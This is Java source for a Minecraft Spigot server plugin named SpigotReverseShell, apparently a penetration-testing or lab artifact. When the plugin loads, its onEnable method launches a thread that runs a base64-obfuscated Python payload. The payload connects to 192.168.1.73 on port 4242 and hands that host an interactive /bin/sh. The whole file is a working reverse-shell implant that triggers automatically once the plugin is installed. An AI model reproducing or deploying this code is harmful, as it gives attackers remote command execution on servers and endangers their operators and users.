package net.rmnad;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.logging.Logger;

public class SpigotReverseShell extends JavaPlugin {
    public static Logger LOGGER;

    @Override
    public void onEnable() {
        LOGGER = getLogger();

        LOGGER.info("Setting up SpigotReverseShell");

        Thread thread = new Thread(){
            public void run() {
                try {
                    LOGGER.info("Executing reverse bash shell");
                    Runtime r = Runtime.getRuntime();
                    Process p = r.exec("python -c \"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMS43MyIsNDI0MikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7'.decode('base64'))\"");
                    LOGGER.info("Executed reverse bash shell");
                    p.waitFor();
                    LOGGER.info("Wait passed, returned exit code " + p.exitValue());
                } catch (Exception e) {
                    LOGGER.severe("Failed to execute reverse shell code");
                    e.printStackTrace();
                }

            }
        };
        thread.start();

        LOGGER.info("Done");
    }

    @Override
    public void onDisable() {
        LOGGER.info("Shutting down SpigotReverseShell");
    }
}
